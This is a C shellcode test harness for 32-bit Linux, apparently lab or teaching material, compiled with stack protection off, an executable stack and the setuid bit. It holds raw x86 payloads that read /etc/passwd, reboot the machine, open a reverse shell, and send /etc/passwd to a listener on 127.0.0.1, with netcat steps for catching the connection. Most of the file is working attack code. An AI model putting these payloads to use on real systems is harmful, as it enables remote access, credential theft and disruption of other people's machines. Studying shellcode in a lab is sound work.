// gcc test-shellcode-32.c -o test-shellcode -fno-stack-protector -z execstack; chmod 4755 test-shellcode; ./test-shellcode

// print Hello World
char code[] = 	"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
              	"\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";

// read etc/passwd
//char code[] =	"\xeb\x1f\x59\x31\xc0\x31\xd2\x31\xdb\xb0\x0b\xb2\x00"\
 				"\x53\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3"\
				"\x52\x51\x53\x89\xe1\xcd\x80\xe8\xdc\xff\xff\xff\x2f"\
				"\x65\x74\x63\x2f\x2f\x70\x61\x73\x73\x77\x64";

// reboot
//char code[] =	"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"\
				"\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"\
				"\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"\
				"\x89\xe1\xb0\x0b\xcd\x80";

// reverse shell
// To use this one code do the following:
// 1. open a new shell (S2) and run nc -lv 1337
// 2. run ./test-shellcode in the original shell (S1)
// 3. You have now access to S1 from S2. Try to run ls in S2. You are indeed 'ls'-ing the folder in S1.
#define IPADDR "\x7f\x00\x00\x01" /* 127.0.0.1 */
//char code[] = 	"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89"\
				"\xe1\xcd\x80\x92\xb0\x66\x68"IPADDR"\x66\x68\x05\x39"\
				"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd"\
				"\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9"\
				"\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f"\
				"\x62\x69\x6e\x89\xe3\xcd\x80";

// reverse shell that reads /etc/passwd and sends the content to 127.0.0.1 port 12345.
// To use this one code do the following:
// 1. open a new shell (S2) and run nc -lv 12345
// 2. run ./test-shellcode in the original shell (S1)
// 3. You have now receive in S2 the result of the /etc/passwd of S1.
//char code[] = 	"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02"\
				"\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68"IPADDR\
				"\x66\x68\x30\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89"\
				"\xe1\x43\xcd\x80\x89\xc6\x6a\x01\x59\xb0\x3f\xcd\x80"\
				"\xeb\x27\x6a\x05\x58\x5b\x31\xc9\xcd\x80\x89\xc3\xb0"\
				"\x03\x89\xe7\x89\xf9\x31\xd2\xb6\xff\xb2\xff\xcd\x80"\
				"\x89\xc2\x6a\x04\x58\xb3\x01\xcd\x80\x6a\x01\x58\x43"\
				"\xcd\x80\xe8\xd4\xff\xff\xff\x2f\x65\x74\x63\x2f\x70"\
				"\x61\x73\x73\x77\x64";


int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
     return 0;
}
